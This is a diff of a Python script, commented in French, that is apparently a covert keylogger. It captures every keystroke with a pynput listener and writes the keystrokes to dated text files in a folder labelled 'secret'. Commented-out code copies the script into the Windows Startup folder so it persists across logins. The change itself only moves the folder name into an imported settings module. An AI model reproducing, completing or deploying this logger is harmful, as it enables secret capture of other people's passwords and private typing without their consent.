@@ -14,11 +14,11 @@ nomFichierActuelle = os.path.basename(__file__)
 #copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")
 #flm juste creer un raccourci et colle le
 # **** EMPLACEMENT SAUVEGARDE
-NOM_DOSSIER_SECRET = "C:/data_key_screen"
-
-nomEmplacementSauvegarde = NOM_DOSSIER_SECRET 
+from others.variables_param import NOM_DOSSIER_SECRET 
+nomEmplacementSauvegarde = NOM_DOSSIER_SECRET
 if not os.path.exists(nomEmplacementSauvegarde):
 	os.makedirs(nomEmplacementSauvegarde)
+
 
 dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
 datehier = (datetime.datetime.now()++ datetime.timedelta(days=-1)).strftime('%Y-%m-%d')
@@ -30,7 +30,7 @@ nomEmplacementSauvegarde += "/" + dateajd #dossier à la date de aujourd'hui
 if not os.path.exists(nomEmplacementSauvegarde):
 	os.makedirs(nomEmplacementSauvegarde)
 nomfile = username + " touch " + dateajd + ".txt"
-nomfile_hier = username + " touch " + datehier + ".txt"
+
 # **** YEAH SAUGARDES DES TOUCHE SUR FICHIER TXT
 logging_dir = nomEmplacementSauvegarde
 FORMATT = dateheure + " %(message)s"
@@ -46,9 +46,5 @@ def on_press(key):
 with Listener(on_press=on_press) as lis:
     lis.join()
 
-    
-    
-    
-
-	  
+   	  
 
